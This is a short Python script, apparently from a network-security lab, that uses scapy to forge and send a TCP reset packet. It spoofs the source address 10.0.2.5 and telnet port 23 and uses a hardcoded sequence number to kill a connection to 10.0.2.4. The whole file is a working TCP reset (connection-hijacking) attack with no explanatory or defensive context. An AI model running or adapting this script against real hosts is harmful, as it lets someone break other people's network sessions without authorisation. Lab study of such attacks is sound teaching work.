#!/usr/bin/python3
import sys
from scapy.all import *

num = 1130583305 

print("SENDING RESET PACKET.........")
IPLayer = IP(src="10.0.2.5", dst="10.0.2.4")
TCPLayer = TCP(sport=23, dport=41670, flags="R", seq=num)
pkt = IPLayer/TCPLayer
#ls(pkt)
send(pkt, verbose=0)
